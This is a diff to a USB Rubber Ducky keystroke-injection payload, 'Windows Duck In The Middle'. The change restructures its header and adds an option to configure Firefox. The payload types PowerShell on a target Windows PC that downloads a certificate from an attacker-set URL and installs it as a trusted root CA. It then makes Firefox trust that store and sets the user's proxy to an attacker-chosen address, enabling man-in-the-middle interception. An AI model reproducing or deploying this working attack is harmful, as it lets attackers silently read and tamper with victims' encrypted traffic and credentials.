@@ -1,24 +1,21 @@
-REM Title: Windows Duck In The Middle
-REM Author: Who-Is-Julien
-REM Description: The payload configures the target PC user to redirect network traffic via a proxy, enabling a Man-in-the-middle attack.
-REM Target: Windows 10, 11
-REM Documentation: https://github.com/Who-Is-Julien/Ducky-Utilities/blob/main/Payloads/Windows-Duck-In-The-Middle/README.md
+REM_BLOCK INFOS
+    Title: Windows Duck In The Middle
+    Author: Who-Is-Julien
+    Description: The payload configures the target PC user to redirect network traffic via a proxy, enabling a Man-in-the-middle attack.
+    Target: Windows 10, 11
+    Documentation: https://github.com/Who-Is-Julien/Ducky-Utilities/blob/main/Payloads/Windows-Duck-In-The-Middle/README.md
+END_REM
 
-REM Basic options:
-REM The download link for your Trusted Root CA certificate
+REM Required options:
 DEFINE CERT_URL example.com
-REM Your proxy's IP address
 DEFINE PROXY_IP 127.0.0.1
-REM Your proxy port
 DEFINE PROXY_PORT 8080
 
 REM Advanced options:
-REM Short delay time
 DEFINE SHORT_DELAY 500
-REM Medium delay time
 DEFINE MEDIUM_DELAY 2000
-REM Long delay time
 DEFINE LONG_DELAY 4000
+DEFINE CONFIGURE_FIREFOX TRUE
 
 EXTENSION PASSIVE_DETECT_READY
     REM VERSION 1.1
@@ -53,7 +50,11 @@ STRING i
 DELAY MEDIUM_DELAY
 STRING Clear-Host; $c = New-TemporaryFile; try { Invoke-WebRequest -Uri "
 STRING CERT_URL
-STRING " -OutFile $c; Import-Certificate -FilePath $c -CertStoreLocation "Cert:\CurrentUser\Root"; if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") { Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "prefs.js" -Recurse | ForEach-Object { (Get-Content $_.FullName) -replace '"security.enterprise_roots.enabled", false', '"security.enterprise_roots.enabled", true' | Set-Content $_.FullName } }; @{"ProxyServer" = "
+STRING " -OutFile $c; Import-Certificate -FilePath $c -CertStoreLocation "Cert:\CurrentUser\Root"; 
+IF ( CONFIGURE_FIREFOX == TRUE ) THEN
+    STRING if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") { Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "prefs.js" -Recurse | ForEach-Object { (Get-Content $_.FullName) -replace '"security.enterprise_roots.enabled", false', '"security.enterprise_roots.enabled", true' | Set-Content $_.FullName } }; 
+END_IF
+STRING @{"ProxyServer" = "
 STRING PROXY_IP
 STRING :
 STRING PROXY_PORT
